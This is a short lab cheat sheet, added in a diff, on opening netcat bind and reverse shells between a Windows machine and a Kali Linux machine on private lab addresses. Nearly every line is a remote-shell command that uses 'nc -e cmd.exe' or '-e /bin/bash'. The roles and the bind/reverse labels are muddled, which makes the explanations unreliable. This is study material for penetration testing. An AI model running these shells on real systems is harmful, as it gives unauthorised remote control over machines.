@@ -1,0 +1,27 @@
+Assume Bob is Windows machine(10.11.22.20) and Alice is Kali linux (tap0 address 10.11.0.204):
+1) bind shell from kali linux to windows:
+Alice:
+nc -nlvp 4444 -e cmd.exe
+Bob:
+nc -nv 10.11.22.20 4444 
+in this case Alice has cmd prompt of windows machine in kali linux:
+
+2) bind shell from windows to kali linux:
+Alice:
+nc -nv 10.11.0.204 4444 -e cmd.exe
+Bob:
+nc -nlvp  4444
+in this case Alice has cmd prompt of windows machine in kali linux:
+
+3) reverse shell
+Alice:
+nc -nv 10.11.22.20 4444 -e /bin/bash
+Bob:
+nc -nlvp 4444
+
+4) reverse shell
+Alice:
+nc -nlvp  4444 -e /bin/bash
+Bob:
+nc -nv 10.11.0.204 4444
+ in reverse shell cases windows will have access of kali machine.
